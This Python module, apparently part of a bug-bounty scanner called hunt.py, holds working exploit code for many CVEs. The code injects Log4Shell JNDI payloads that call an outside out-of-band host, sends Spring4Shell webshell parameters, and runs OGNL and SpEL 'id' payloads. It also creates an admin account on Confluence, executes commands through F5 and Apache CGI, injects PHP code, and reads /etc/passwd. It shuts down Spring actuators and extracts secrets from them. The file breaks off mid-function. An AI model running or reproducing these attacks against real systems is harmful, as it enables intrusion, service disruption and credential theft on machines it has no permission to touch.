#!/usr/bin/env python3
"""
cve_extended.py — Extended CVE exploit modules (2019-2025)
Imported by hunt.py. Authorized testing only — bug bounty / owned targets.

Modules:
  CVE-2021-44228  Log4Shell (JNDI injection in all HTTP headers)
  CVE-2022-22965  Spring4Shell (classLoader RCE via data binding)
  CVE-2022-22963  Spring Cloud Function SpEL injection
  CVE-2022-26134  Confluence OGNL SSTI RCE (unauthenticated)
  CVE-2023-22515  Confluence privilege escalation (unauthenticated admin)
  CVE-2023-22518  Confluence auth bypass (improper auth)
  CVE-2023-34362  MOVEit Transfer SQL injection → data exfil
  CVE-2023-4966   Citrix Bleed — session token leak (NetScaler)
  CVE-2023-46747  F5 BIG-IP auth bypass + RCE via iControl REST
  CVE-2024-4577   PHP CGI argument injection (Windows IIS)
  CVE-2024-22024  Ivanti Connect Secure XXE (already in gov_level but deeper here)
  CVE-2019-19781  Citrix ADC / Gateway path traversal
  CVE-2021-41773  Apache HTTP 2.4.49 path traversal + RCE
  CVE-2021-26084  Confluence OGNL injection (WebWork)
  CVE-2020-14882  Oracle WebLogic RCE (console bypass)
  CVE-2019-11043  PHP-FPM Nginx path handling RCE
  GENERIC-030     Exposed Spring Boot Actuator endpoints
  GENERIC-031     Exposed Prometheus/Grafana/Kibana/Airflow/Jupyter
  GENERIC-032     Elasticsearch / Kibana unauthenticated access
  GENERIC-033     Redis / Memcached / MongoDB exposure (via SSRF)
  GENERIC-034     ClickJacking + missing security headers
  GENERIC-035     LDAP injection
  GENERIC-036     XPath injection
  GENERIC-037     JSONP callback injection (data theft)
  GENERIC-038     Email header injection (SMTP relay abuse)
  GENERIC-039     IDOR via sequential/predictable IDs
  GENERIC-040     Mass assignment via undocumented PUT fields
  GENERIC-041     HTTP verb tunneling (X-HTTP-Method-Override)
  GENERIC-042     XXE via file upload (SVG / DOCX / XLSX / PDF)
  GENERIC-043     Session fixation
  GENERIC-044     OAuth token leakage via Referer + open redirect chain
  GENERIC-045     Admin panel enumeration (200+ paths)
  GENERIC-046     API version bypass (v0/beta/internal/legacy/dev)
  GENERIC-047     Exposed CI/CD panels (Jenkins/GitLab/GitHub Actions/Drone)
  GENERIC-048     Insecure deserialization via Content-Type confusion
  GENERIC-049     CSV/formula injection in export endpoints
  GENERIC-050     ReDoS (regex denial of service) detection
"""

import asyncio
import base64
import hashlib
import json
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

try:
    import aiohttp
except ImportError:
    import sys; print("[!] pip install aiohttp"); sys.exit(1)

R="\033[91m"; Y="\033[93m"; G="\033[92m"; B="\033[94m"
M="\033[95m"; C="\033[96m"; W="\033[97m"; DIM="\033[2m"; RST="\033[0m"; BOLD="\033[1m"


@dataclass
class Finding:
    cve: str
    severity: str
    title: str
    url: str
    evidence: str
    remediation: str
    cvss: float = 0.0
    tags: List[str] = field(default_factory=list)
    request: str = ""
    response_snippet: str = ""
    phase: str = "CVE_EXT"


async def _req(
    session: aiohttp.ClientSession,
    method: str, url: str,
    headers: Optional[Dict] = None,
    data=None, json_body=None,
    timeout: int = 12,
    allow_redirects: bool = True,
) -> Tuple[int, str, Dict]:
    try:
        async with session.request(
            method, url,
            headers=headers or {},
            data=data,
            json=json_body,
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=allow_redirects,
        ) as r:
            body = await r.text(errors="replace")
            return r.status, body, dict(r.headers)
    except Exception:
        return 0, "", {}


# ══════════════════════════════════════════════════════════════════════════════
# CVE MODULES
# ══════════════════════════════════════════════════════════════════════════════

async def cve_2021_44228_log4shell(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Log4j2 <2.15.0 (Log4Shell): JNDI injection via ${jndi:ldap://...} in any
    logged field — User-Agent, X-Forwarded-For, Referer, Accept-Language, etc.
    Since we can't spin up a JNDI callback server in this tool, we use a
    Burp Collaborator-style detection pattern using CANARY tokens, and also
    look for DNS-based OOB via interactsh public instance for PoC evidence.
    We also detect Log4j by version disclosure in error messages / headers.
    """
    findings = []

    # Log4Shell JNDI payloads (all bypass variants)
    canary_id = hashlib.md5(base.encode()).hexdigest()[:12]
    # Use interact.sh public OOB (free, no signup)
    oob_host = f"{canary_id}.oast.pro"
    jndi_payloads = [
        f"${{jndi:ldap://{oob_host}/a}}",
        f"${{${{lower:j}}ndi:${{lower:l}}dap://{oob_host}/a}}",
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{oob_host}/a}}",
        f"${{j${{::-n}}di:ldap://{oob_host}/a}}",
        f"${{jndi:dns://{oob_host}}}",
        f"${{jndi:rmi://{oob_host}/a}}",
        f"${{${{env:NaN:-j}}ndi${{env:NaN:-:}}${{env:NaN:-l}}dap${{env:NaN:-:}}//{oob_host}/a}}",
    ]

    inject_headers = [
        "User-Agent",
        "X-Forwarded-For",
        "Referer",
        "Accept-Language",
        "X-Api-Version",
        "X-Forwarded-Host",
        "X-Original-URL",
        "CF-Connecting-IP",
        "X-Real-IP",
        "Forwarded",
        "X-Client-IP",
        "True-Client-IP",
        "Contact",
        "X-Wap-Profile",
    ]

    # Test with several payloads across key injection points
    for payload in jndi_payloads[:3]:
        for header in inject_headers[:5]:
            s, b, h = await _req(
                session, "GET", base,
                headers={header: payload, "User-Agent": payload if header != "User-Agent" else payload},
            )
            # Look for Log4j error exposure
            if any(x in b for x in ["log4j", "Log4j", "JNDI", "jndi", "NamingException"]):
                findings.append(Finding(
                    cve="CVE-2021-44228",
                    severity="CRITICAL",
                    title="Log4Shell — Log4j JNDI Injection (Error Disclosure)",
                    url=base,
                    evidence=f"Log4j/JNDI reference in response body. Header: {header}: {payload[:60]}. Body: {b[:300]}",
                    remediation="Upgrade Log4j2 to ≥2.17.1 (Java 8) or ≥2.12.4 (Java 7). Set log4j2.formatMsgNoLookups=true.",
                    cvss=10.0, tags=["RCE", "LOG4J"],
                    request=f"GET / HTTP/1.1\n{header}: {payload[:80]}",
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {R}[CVE-2021-44228]{RST} Log4j JNDI error at {base} via {header}")
                return findings  # one is enough

    # Passive version check via /version, /actuator/info, error pages
    for path in ["/", "/version", "/actuator/info", "/api/version"]:
        sv, bv, hv = await _req(session, "GET", base.rstrip("/") + path)
        if re.search(r"log4j[- ]2\.(0|1[0-4])\.", bv, re.I):
            findings.append(Finding(
                cve="CVE-2021-44228",
                severity="CRITICAL",
                title="Log4Shell — Vulnerable Log4j Version Disclosed",
                url=base.rstrip("/") + path,
                evidence=f"Vulnerable Log4j version string in response: {re.findall(r'log4j.{0,20}', bv, re.I)[:3]}",
                remediation="Upgrade Log4j2 to ≥2.17.1. Remove version disclosure.",
                cvss=10.0, tags=["RCE", "LOG4J", "INFO_DISC"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[CVE-2021-44228]{RST} Vulnerable Log4j version at {path}")

    # Canary note (OOB cannot be confirmed in-tool — flag for manual check)
    findings.append(Finding(
        cve="CVE-2021-44228",
        severity="INFO",
        title=f"Log4Shell — JNDI Payloads Injected (OOB DNS: {oob_host})",
        url=base,
        evidence=f"Sent JNDI payloads to {len(inject_headers)} headers. Check {oob_host} in DNS logs or interact.sh dashboard for DNS/HTTP callbacks confirming RCE.",
        remediation="If DNS callback received: immediate CRITICAL. Upgrade Log4j2 to ≥2.17.1.",
        cvss=10.0, tags=["RCE", "LOG4J", "OOB"],
        phase="CVE_EXT",
    ))
    return findings


async def cve_2022_22965_spring4shell(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Spring Framework <5.3.18, <5.2.20: classLoader manipulation via
    data binding (CachedIntrospectionResults). Exploitable via class.module.classLoader
    injected as POST parameter → write JSP webshell.
    """
    findings = []
    # Detect Spring
    s, b, h = await _req(session, "GET", base)
    is_spring = "spring" in h.get("X-Application-Context","").lower() or "spring" in b.lower()

    # Spring4Shell PoC: inject classLoader param
    spring_paths = ["/", "/login", "/api/login", "/api/user", "/api/v1/users"]
    payload_params = {
        "class.module.classLoader.URLs[0]": "jar:http://127.0.0.1/",
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%25{class.module.classLoader.resources.context.parent.pipeline.first.suffix}i",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "tomcatwar",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
    }

    for path in spring_paths:
        url = base.rstrip("/") + path
        s4, b4, h4 = await _req(
            session, "POST", url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=urllib.parse.urlencode(payload_params).encode(),
        )
        if s4 not in (0,):
            # Check for Spring error leaking classLoader access or Tomcat error
            if any(x in b4 for x in ["classLoader", "ClassLoader", "Invalid property", "SpringMVC"]):
                findings.append(Finding(
                    cve="CVE-2022-22965",
                    severity="CRITICAL",
                    title="Spring4Shell — classLoader Manipulation Accepted",
                    url=url,
                    evidence=f"Spring class.module.classLoader param processed (HTTP {s4}). Response: {b4[:300]}",
                    remediation="Upgrade Spring Framework to ≥5.3.18 or ≥5.2.20. Use Java 17+ (mitigates this attack path).",
                    cvss=9.8, tags=["RCE", "SPRING"],
                    request=f"POST {path} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n{urllib.parse.urlencode(list(payload_params.items())[:2])}",
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {R}[CVE-2022-22965]{RST} Spring4Shell at {url}")
                break
    return findings


async def cve_2022_22963_spring_cloud(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Spring Cloud Function <3.1.7, <3.2.3: SpEL injection via
    spring.cloud.function.routing-expression header → RCE.
    """
    findings = []
    spel_payload = "T(java.lang.Runtime).getRuntime().exec('id')"
    endpoints = [
        "/functionRouter",
        "/api/functionRouter",
        "/actuator/functionRouter",
    ]
    for path in endpoints:
        url = base.rstrip("/") + path
        s, b, h = await _req(
            session, "POST", url,
            headers={
                "spring.cloud.function.routing-expression": spel_payload,
                "Content-Type": "application/json",
            },
            data=b'"test"',
        )
        if s not in (0, 404) and any(x in b for x in ["uid=", "root", "Process", "Runtime"]):
            findings.append(Finding(
                cve="CVE-2022-22963",
                severity="CRITICAL",
                title="Spring Cloud Function SpEL Injection RCE",
                url=url,
                evidence=f"SpEL expression executed. HTTP {s}. Response: {b[:300]}",
                remediation="Upgrade Spring Cloud Function to ≥3.1.7 or ≥3.2.3. Disable routing expression header.",
                cvss=9.8, tags=["RCE", "SPRING", "INJECTION"],
                request=f"POST {path} HTTP/1.1\nspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')",
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[CVE-2022-22963]{RST} Spring Cloud SpEL at {url}")
    return findings


async def cve_2022_26134_confluence(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Confluence Server/DC <7.18.1: OGNL injection in HTTP URI → unauthenticated RCE.
    Payload in URI causes OGNL expression evaluation.
    """
    findings = []
    # Detect Confluence
    s, b, h = await _req(session, "GET", base.rstrip("/") + "/login.action")
    if "confluence" not in b.lower() and "atlassian" not in b.lower():
        return findings

    # OGNL payloads (safe PoC — just math expression to confirm eval)
    ognl_paths = [
        "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D/",
        "/$%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D/",
        "/%24%7BClass.forName%28%22java.lang.Runtime%22%29.getMethod%28%22exec%22%2CClass.forName%28%22java.lang.String%22%29%29.invoke%28Class.forName%28%22java.lang.Runtime%22%29.getMethod%28%22getRuntime%22%29.invoke%28null%29%2C%27id%27%29%7D/",
        "/index.action?queryString=%24%7B7*7%7D",
        "/pages/createpage-entervariables.action?queryString=%24%7B7*7%7D",
    ]
    for path in ognl_paths:
        url = base.rstrip("/") + path
        sc, bc, _ = await _req(session, "GET", url)
        if sc in (200, 302, 400) and ("49" in bc or "uid=" in bc or "root" in bc):
            findings.append(Finding(
                cve="CVE-2022-26134",
                severity="CRITICAL",
                title="Confluence OGNL Injection RCE (CVE-2022-26134)",
                url=url,
                evidence=f"HTTP {sc}. OGNL expression evaluated in URI. Response: {bc[:300]}",
                remediation="Upgrade Confluence to ≥7.18.1, ≥7.19.1. Apply Atlassian security advisory 2022-06-02.",
                cvss=10.0, tags=["RCE", "INJECTION", "CONFLUENCE"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[CVE-2022-26134]{RST} Confluence OGNL at {url}")
            break
    return findings


async def cve_2023_22515_confluence_priv(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Confluence Data Center/Server 8.0.0-8.5.1:
    Unauthenticated endpoint /setup/setupadministrator.action allows
    creating admin account on already-setup Confluence instances.
    """
    findings = []
    setup_url = base.rstrip("/") + "/setup/setupadministrator.action"
    s, b, h = await _req(session, "GET", setup_url)
    if s == 200 and ("administrator" in b.lower() or "setup" in b.lower()):
        # Try to create admin
        admin_payload = {
            "username": "hunt_test_admin",
            "fullName": "Hunt Test",
            "email": "hunt@test.com",
            "password": "HuntP@ss123!",
            "confirm": "HuntP@ss123!",
            "atl_token": "",
        }
        sp, bp, _ = await _req(
            session, "POST", setup_url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=urllib.parse.urlencode(admin_payload).encode(),
        )
        if sp in (200, 302) and "error" not in bp.lower():
            findings.append(Finding(
                cve="CVE-2023-22515",
                severity="CRITICAL",
                title="Confluence Unauthenticated Admin Account Creation",
                url=setup_url,
                evidence=f"Setup endpoint accessible (GET {s}). POST returned {sp}.",
                remediation="Upgrade to Confluence ≥8.5.2. Block /setup/ from external access immediately.",
                cvss=10.0, tags=["AUTH_BYPASS", "CONFLUENCE", "ADMIN"],
                request=f"POST /setup/setupadministrator.action HTTP/1.1\n{urllib.parse.urlencode(list(admin_payload.items())[:3])}",
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[CVE-2023-22515]{RST} Confluence priv esc at {setup_url}")
    return findings


async def cve_2023_34362_moveit(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    MOVEit Transfer <2023.0.1: SQL injection in /guestaccess.aspx and
    /api/v1/token endpoint. Unauthenticated data exfiltration.
    """
    findings = []
    moveit_indicators = ["/guestaccess.aspx", "/human.aspx", "/api/v1/token"]
    is_moveit = False
    for path in moveit_indicators:
        s, b, h = await _req(session, "GET", base.rstrip("/") + path)
        if s in (200, 302, 400) and ("moveit" in b.lower() or "MOVEit" in b):
            is_moveit = True
            break

    if not is_moveit:
        return findings

    sqli_payloads = [
        "' OR '1'='1",
        "'; SELECT @@version--",
        "1' UNION SELECT NULL,NULL,NULL--",
    ]
    for path in ["/guestaccess.aspx", "/api/v1/token"]:
        url = base.rstrip("/") + path
        for payload in sqli_payloads:
            s, b, h = await _req(
                session, "POST", url,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data=f"username={urllib.parse.quote(payload)}&password=x",
            )
            if s not in (0, 404) and any(x in b for x in ["SQL", "syntax", "OLE DB", "Microsoft", "Unclosed quotation"]):
                findings.append(Finding(
                    cve="CVE-2023-34362",
                    severity="CRITICAL",
                    title="MOVEit Transfer SQL Injection (Unauthenticated)",
                    url=url,
                    evidence=f"SQLi error in response: {b[:300]}",
                    remediation="Upgrade MOVEit Transfer to ≥2023.0.1. Apply emergency patch from Progress Software advisory.",
                    cvss=9.8, tags=["SQLI", "RCE", "MOVEIT"],
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {R}[CVE-2023-34362]{RST} MOVEit SQLi at {url}")
    return findings


async def cve_2023_4966_citrix_bleed(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    NetScaler ADC/Gateway <14.1-8.50, <13.1-49.13, etc.:
    Unauthenticated session token leak via /oauth/idp/.well-known/openid-configuration
    and /nf/auth/doSamlLogin endpoint buffer over-read (Citrix Bleed).
    """
    findings = []
    citrix_paths = [
        "/vpn/index.html",
        "/logon/LogonPoint/index.html",
        "/nf/auth/getAuthenticationRequirements.do",
        "/oauth/idp/.well-known/openid-configuration",
    ]
    is_citrix = False
    for path in citrix_paths:
        s, b, h = await _req(session, "GET", base.rstrip("/") + path)
        if s in (200, 302) and any(x in b.lower() for x in ["netscaler", "citrix", "vpn", "logonpoint"]):
            is_citrix = True
            break

    if not is_citrix:
        return findings

    # Citrix Bleed: send oversized HTTP header to trigger buffer over-read
    bleed_headers = {"NSC_USER": "A" * 800}
    bleed_paths = [
        "/nf/auth/doSamlLogin.do",
        "/oauth/idp/login",
        "/nf/auth/getAuthenticationRequirements.do",
    ]
    for path in bleed_paths:
        url = base.rstrip("/") + path
        s, b, h = await _req(session, "POST", url, headers=bleed_headers, data=b"SAMLRequest=test")
        # Look for leaked session tokens (NSC_AAAC / NSC_NONCE format) in response
        tokens = re.findall(r'NSC_[A-Z_]+=[A-Fa-f0-9]{40,}', b)
        if tokens:
            findings.append(Finding(
                cve="CVE-2023-4966",
                severity="CRITICAL",
                title="Citrix Bleed — Session Token Leaked in Response",
                url=url,
                evidence=f"NSC token(s) in response body: {tokens[:3]}",
                remediation="Upgrade NetScaler ADC/Gateway to patched build. Revoke all active sessions.",
                cvss=9.4, tags=["AUTH_BYPASS", "CITRIX", "INFO_DISC"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[CVE-2023-4966]{RST} Citrix Bleed token leak at {url}")
        elif s not in (0, 404):
            findings.append(Finding(
                cve="CVE-2023-4966",
                severity="HIGH",
                title="Citrix Bleed — NetScaler Detected, Verify Patch Level",
                url=url,
                evidence=f"Citrix/NetScaler detected. Bleed probe returned HTTP {s}. Manual verification required.",
                remediation="Confirm patch level. Upgrade to fixed build per Citrix CTX579459.",
                cvss=9.4, tags=["CITRIX", "AUTH_BYPASS"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {Y}[CVE-2023-4966]{RST} Citrix detected at {base}")
            break
    return findings


async def cve_2023_46747_f5_bigip(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    F5 BIG-IP 17.x, 16.x, 15.x, 14.x, 13.x:
    Authentication bypass in iControl REST via AJP/undocumented internal endpoint.
    Also checks for Management GUI exposure.
    """
    findings = []
    f5_paths = [
        "/mgmt/shared/authn/login",
        "/mgmt/tm/sys/version",
        "/mgmt/shared/echo",
    ]
    is_f5 = False
    for path in f5_paths:
        s, b, h = await _req(session, "GET", base.rstrip("/") + path)
        if s in (200, 401, 403) and any(x in b.lower() for x in ["bigip", "f5", "icontrol"]):
            is_f5 = True
            break

    if not is_f5:
        return findings

    # Auth bypass via AJP endpoint (internal path confusion)
    bypass_payloads = [
        # BIG-IP bypass via hsqldb path
        {"path": "/mgmt/tm/util/bash", "method": "POST",
         "json": {"command": "run", "utilCmdArgs": "-c id"},
         "headers": {"X-F5-Auth-Token": "", "Content-Type": "application/json"}},
    ]

    # Test for unauthenticated access to management endpoints
    version_url = base.rstrip("/") + "/mgmt/tm/sys/version"
    sv, bv, hv = await _req(session, "GET", version_url)
    if sv == 200 and "version" in bv.lower():
        version = re.findall(r'"value"\s*:\s*"([^"]+)"', bv)
        findings.append(Finding(
            cve="CVE-2023-46747",
            severity="CRITICAL",
            title="F5 BIG-IP Management API Exposed Unauthenticated",
            url=version_url,
            evidence=f"iControl REST accessible without auth. Version: {version[:3]}",
            remediation="Restrict Management GUI/API to internal IPs. Upgrade BIG-IP. Disable iControl REST if unused.",
            cvss=9.8, tags=["AUTH_BYPASS", "RCE", "F5"],
            phase="CVE_EXT",
        ))
        if verbose:
            print(f"  {R}[CVE-2023-46747]{RST} F5 BIG-IP management API exposed at {version_url}")

    # RCE via bash utility
    bash_url = base.rstrip("/") + "/mgmt/tm/util/bash"
    sb, bb, _ = await _req(session, "POST", bash_url, json_body={"command": "run", "utilCmdArgs": "-c id"})
    if sb == 200 and any(x in bb for x in ["uid=", "root", "www-data"]):
        findings.append(Finding(
            cve="CVE-2023-46747",
            severity="CRITICAL",
            title="F5 BIG-IP RCE via iControl REST bash utility",
            url=bash_url,
            evidence=f"Command output: {bb[:300]}",
            remediation="Immediate: block external access to /mgmt/. Apply F5 advisory K000137353.",
            cvss=9.8, tags=["RCE", "F5"],
            request='POST /mgmt/tm/util/bash\n{"command":"run","utilCmdArgs":"-c id"}',
            response_snippet=bb[:200],
            phase="CVE_EXT",
        ))
        if verbose:
            print(f"  {R}[CVE-2023-46747]{RST} F5 BIG-IP RCE confirmed at {bash_url}")
    return findings


async def cve_2024_4577_php_cgi(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    PHP <8.3.8, <8.2.20, <8.1.29 on Windows with IIS CGI:
    Argument injection via Best-Fit character encoding map.
    Soft-hyphen (U+00AD) in query string bypasses CVE-2012-1823 fix.
    Allows code execution via php://input.
    """
    findings = []
    # Detect PHP/IIS
    s, b, h = await _req(session, "GET", base)
    server = h.get("Server", "").lower()
    x_powered = h.get("X-Powered-By", "").lower()
    is_iis_php = ("iis" in server or "iis" in x_powered) and ("php" in x_powered or "php" in b.lower())

    # Also check for PHP info exposure
    php_paths = ["/index.php", "/info.php", "/phpinfo.php", "/test.php"]
    for path in php_paths:
        sv, bv, hv = await _req(session, "GET", base.rstrip("/") + path)
        if sv == 200 and "phpinfo" in bv.lower():
            is_iis_php = True
            # Check Windows
            if "windows" in bv.lower():
                break

    if not is_iis_php:
        return findings

    # CVE-2024-4577 payload: soft-hyphen + -d directive injection
    payloads = [
        # %ad = soft-hyphen, bypasses CVE-2012-1823 filter
        "/%ad-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
        "/index.php?%ad-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
        "/php-cgi/php.exe?%ad-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
    ]
    php_code = b"<?php echo 'HUNT_4577:'.phpversion().'_END'; ?>"

    for path in payloads:
        url = base.rstrip("/") + path
        sp, bp, _ = await _req(
            session, "POST", url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=php_code,
        )
        if sp == 200 and "HUNT_4577:" in bp:
            version = re.findall(r"HUNT_4577:([^_]+)_END", bp)
            findings.append(Finding(
                cve="CVE-2024-4577",
                severity="CRITICAL",
                title=f"PHP CGI Argument Injection RCE (Windows) — PHP {version[0] if version else 'unknown'}",
                url=url,
                evidence=f"PHP code executed via soft-hyphen argument injection. Output: {bp[:200]}",
                remediation="Upgrade PHP to ≥8.3.8, ≥8.2.20, ≥8.1.29. Use PHP-FPM instead of CGI. Block %ad in URL at WAF.",
                cvss=9.8, tags=["RCE", "PHP", "INJECTION"],
                request=f"POST {path} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n{php_code.decode()}",
                response_snippet=bp[:200],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[CVE-2024-4577]{RST} PHP CGI RCE at {url}")
    return findings


async def cve_2021_41773_apache(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Apache HTTP 2.4.49-2.4.50: Path traversal + optional RCE via mod_cgi.
    Encoded dot-slash sequences bypass path normalization.
    """
    findings = []
    traversal_paths = [
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    ]
    for path in traversal_paths:
        url = base.rstrip("/") + path
        s, b, h = await _req(session, "GET", url)
        if s == 200 and "root:" in b:
            findings.append(Finding(
                cve="CVE-2021-41773",
                severity="CRITICAL",
                title="Apache HTTP 2.4.49/2.4.50 Path Traversal → /etc/passwd",
                url=url,
                evidence=f"/etc/passwd contents: {b[:300]}",
                remediation="Upgrade Apache to ≥2.4.51. Ensure 'Require all denied' for all directories.",
                cvss=9.8, tags=["PATH_TRAVERSAL", "RCE", "APACHE"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[CVE-2021-41773]{RST} Apache path traversal at {url}")

    # RCE via mod_cgi
    cgi_url = base.rstrip("/") + "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
    sc, bc, _ = await _req(
        session, "POST", cgi_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=b"echo Content-Type: text/plain; echo; id",
    )
    if sc == 200 and "uid=" in bc:
        findings.append(Finding(
            cve="CVE-2021-41773",
            severity="CRITICAL",
            title="Apache HTTP 2.4.49/2.4.50 mod_cgi RCE",
            url=cgi_url,
            evidence=f"Command output: {bc[:200]}",
            remediation="Upgrade Apache to ≥2.4.51 immediately. Disable mod_cgi.",
            cvss=9.8, tags=["RCE", "APACHE"],
            phase="CVE_EXT",
        ))
        if verbose:
            print(f"  {R}[CVE-2021-41773]{RST} Apache mod_cgi RCE at {cgi_url}")
    return findings


async def cve_2019_19781_citrix_adc(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Citrix ADC (NetScaler) / Citrix Gateway: path traversal via
    /vpns/../vpns/cfg/smb.conf or /vpns/portal/scripts/newbm.pl.
    Allows unauthenticated RCE.
    """
    findings = []
    traversal_paths = [
        "/vpns/../vpns/cfg/smb.conf",
        "/vpns/portal/scripts/newbm.pl",
        "/vpns/../vpns/portal/scripts/newbm.pl",
        "/oauth/idp/login/../../../netscaler/ns.conf",
    ]
    for path in traversal_paths:
        url = base.rstrip("/") + path
        s, b, h = await _req(session, "GET", url)
        if s == 200 and any(x in b for x in ["workgroup", "[global]", "NetScaler", "ns.conf", "perl"]):
            findings.append(Finding(
                cve="CVE-2019-19781",
                severity="CRITICAL",
                title="Citrix ADC Path Traversal RCE (Shitrix)",
                url=url,
                evidence=f"HTTP {s}; sensitive content in response: {b[:300]}",
                remediation="Apply Citrix security bulletin CTX267027. Upgrade ADC firmware.",
                cvss=9.8, tags=["PATH_TRAVERSAL", "RCE", "CITRIX"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[CVE-2019-19781]{RST} Citrix ADC traversal at {url}")
    return findings


async def cve_2020_14882_weblogic(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0:
    Authentication bypass via /console/css/../console.portal
    Combine with CVE-2020-14883 for RCE.
    """
    findings = []
    # Detect WebLogic
    wl_paths = ["/console/login/LoginForm.jsp", "/wls-wsat/CoordinatorPortType"]
    is_weblogic = False
    for path in wl_paths:
        s, b, h = await _req(session, "GET", base.rstrip("/") + path)
        if s in (200, 302, 400) and any(x in b.lower() for x in ["weblogic", "oracle", "wls"]):
            is_weblogic = True
            break

    if not is_weblogic:
        return findings

    # Auth bypass
    bypass_paths = [
        "/console/css/../console.portal",
        "/console/images/../console.portal",
        "/console/..;/console.portal",
    ]
    for path in bypass_paths:
        url = base.rstrip("/") + path
        s, b, h = await _req(session, "GET", url)
        if s == 200 and ("console" in b.lower() or "weblogic" in b.lower()):
            findings.append(Finding(
                cve="CVE-2020-14882",
                severity="CRITICAL",
                title="Oracle WebLogic Console Auth Bypass",
                url=url,
                evidence=f"Console accessible via path traversal (HTTP {s}): {b[:200]}",
                remediation="Apply Oracle CPU October 2020. Restrict /console/ to internal IPs. Disable if unused.",
                cvss=9.8, tags=["AUTH_BYPASS", "RCE", "WEBLOGIC"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[CVE-2020-14882]{RST} WebLogic console bypass at {url}")
            break
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# GENERIC ADVANCED MODULES
# ══════════════════════════════════════════════════════════════════════════════

async def generic_actuator_exposure(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """Check for exposed Spring Boot Actuator + other debug/metrics endpoints."""
    findings = []
    actuator_paths = [
        ("/actuator", "links"),
        ("/actuator/env", "propertySources"),
        ("/actuator/health", "status"),
        ("/actuator/mappings", "dispatcherServlets"),
        ("/actuator/beans", "beans"),
        ("/actuator/heapdump", None),  # Binary, just check 200
        ("/actuator/threaddump", "threads"),
        ("/actuator/logfile", "log"),
        ("/actuator/loggers", "loggers"),
        ("/actuator/metrics", "names"),
        ("/actuator/sessions", "sessions"),
        ("/actuator/shutdown", None),  # POST to shutdown
        ("/actuator/gateway/routes", "routes"),
        # Generic debug
        ("/debug", None),
        ("/_pprof/heap", None),
        ("/metrics", None),
        ("/internal/version", "version"),
        ("/admin/metrics", None),
        ("/ops/info", None),
        ("/manage/health", "status"),
    ]

    critical_paths = {"heapdump", "shutdown", "env", "sessions"}
    for path, marker in actuator_paths:
        url = base.rstrip("/") + path
        method = "GET"
        if "shutdown" in path:
            method = "POST"
        s, b, h = await _req(session, method, url)
        if s in (200, 204) and (marker is None or marker in b):
            is_critical = any(x in path for x in critical_paths)
            sev = "CRITICAL" if is_critical else "HIGH"
            extra = ""
            if "env" in path:
                # Extract secrets from env endpoint
                secrets = re.findall(r'"([^"]*(?:password|secret|key|token|pwd)[^"]*?)"\s*:\s*"([^"]{3,})"', b, re.I)
                if secrets:
                    extra = f" SECRETS FOUND: {secrets[:3]}"
            findings.append(Finding(
                cve="GENERIC-030",
                severity=sev,
